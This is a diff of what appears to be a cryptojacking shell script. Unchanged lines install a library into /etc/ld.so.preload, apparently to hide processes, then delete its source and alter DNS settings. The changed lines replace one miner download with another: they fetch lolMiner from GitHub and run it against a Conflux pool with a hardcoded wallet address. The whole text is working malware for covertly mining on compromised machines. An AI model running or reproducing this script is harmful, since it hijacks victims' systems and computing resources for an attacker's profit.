@@ -8,8 +8,7 @@ echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
-wget https://github.com/TrailingStop/TT-Miner-release/releases/download/2024.3.2/TT-Miner-2024.3.2.tar.gz
-tar xvf TT-Miner-2024.3.2.tar.gz
-cd TT-Miner-2024.3.2
-chmod +x TT-Miner
-./TT-Miner -a ProgPowZ -o stratum+tcp://us.zano.herominers.com:1110 -u ZxCrsFGnUSJ2xoGtycdk3bLHsBZ4FECJPAyccaKVvik7KcmYwX9qiBdcCtEUiJ7NseXT6bYEKtQ9zZHQJJgiGm8g2vmdEeuMd.$(echo $(shuf -i 1000-9999 -n 1)-TETE) -p x
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97/lolMiner_v1.97_Lin64.tar.gz
+tar xvf lolMiner_v1.97_Lin64.tar.gz
+cd v1.97
+./lolMiner --algo OCTOPUS --pool us.conflux.gfwroute.com:1170 --user cfx:aarm2fn0j08r90f00vj7fjkjvs2xe4rfvykrdsfdd5.$(shuf -n 1 -i 1-99999)-KZP
